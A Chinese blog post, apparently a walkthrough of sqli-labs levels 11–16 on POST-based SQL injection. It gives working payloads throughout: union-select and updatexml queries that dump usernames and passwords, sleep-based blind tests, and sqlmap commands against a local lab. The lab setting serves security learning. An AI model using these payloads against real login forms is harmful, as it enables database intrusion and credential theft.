---
 title: Sqlilabs通关笔记(11-16)POST基本注入
 date: 2020-01-06 14:35:27
 tags: SQL注入
 categories: SQL注入
---

## 第十一关 基于错误的POST单引号字符型注入
![2020-1-6-14-53-0](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-14-53-0)

已经显示输入框了，说明是POST提交方式的注入

### 注入点判断
1. 在输入框中输入单引号报错，说明为简单的字符型注入
2. 根据之前GET闯关注入的经验，只是换成post提交
3. 查看字段数，判断为2个字段
> uname=admin' order by 2#&passwd=&submit=Submit 正常
> uname=admin' order by 3#&passwd=&submit=Submit 不正常
4. 直接上payload

**payload直接查出数据库所有数据**
<!--more-->

> uname=-admin' union select group_concat(username,password),2 from users#&passwd=&submit=Submit

![2020-1-6-15-2-36](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-15-2-36)

## 第十二关 基于错误的POST双引号字符型注入
1. 这关与上一关不同在于需要通过双引号来进行闭合，payload类似

> uname=-admin") union select group_concat(username,password),2 from users#&passwd=&submit=Submit

![2020-1-6-15-10-13](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-15-10-13)


## 第十三关 基于POST单引号双注入变形

1. 通过输入反斜杠报错，可以通过')来进行闭合
2. 猜测是报错注入,唯一不同的post传入
3. **直接上payload,可以直接导出所有数据**
> uname=') and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=&submit=Submit

![2020-1-6-17-31-40](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-31-40)

## 第十四关 基于POST双引号双注入变形

1. 与十三关类似，只是需要通过双引号进行闭合
2. **直接上payload**

> uname=" and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=&submit=Submit

## 第十五关 基于POST单引号布尔型时间盲注

1. 使用了\ ’ 等各种姿势网页硬是没有变化
2. 可能是时间盲注
3. 直接用uname=admin' and sleep(10)#&passwd=1&submit=Submit 发现确是时间盲注
4. 直接上sqlmap 或者 写个脚本跑就够了和之前GET时间盲注类似

## 第十六关 基于POST双引号布尔型时间盲注

1. 和十五关类似，只是用双引号闭合

> uname=admin") and sleep(10)#&passwd=1&submit=Submit

### SQLMAP注入
1. 通过burpsuit抓取数据包导入进sqlmap进行注入检测
2. 以less11为例通过bp抓取数据包

![2020-1-6-17-14-20](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-14-20)

3. 选择导出文件为1.txt

![2020-1-6-17-16-3](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-16-3)

**如果要指定参数注入检测可以将该参数修改成***

4. 使用sqlmap载入导出的数据包并进行注入检测

> sqlmap -r "1.txt" -p uname -D security -T users -C username,password --dump --technique ES --batch --threads 10

5. 也可以使用--data传入post参数
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-15/" -data "uname=admin&passwd=admin&submit=Submit" --b
atch --threads 10 --technique T --dbs

* -r 读取抓包文件
* -p 需要检测的参数
* --technique 需要检测的注入方式
    - E 基于报错的注入
    - S 通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入
* --batch 默认选择
* --threads 线程数
* -data 传入post参数（免去抓包）

![2020-1-6-17-23-54](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-23-54)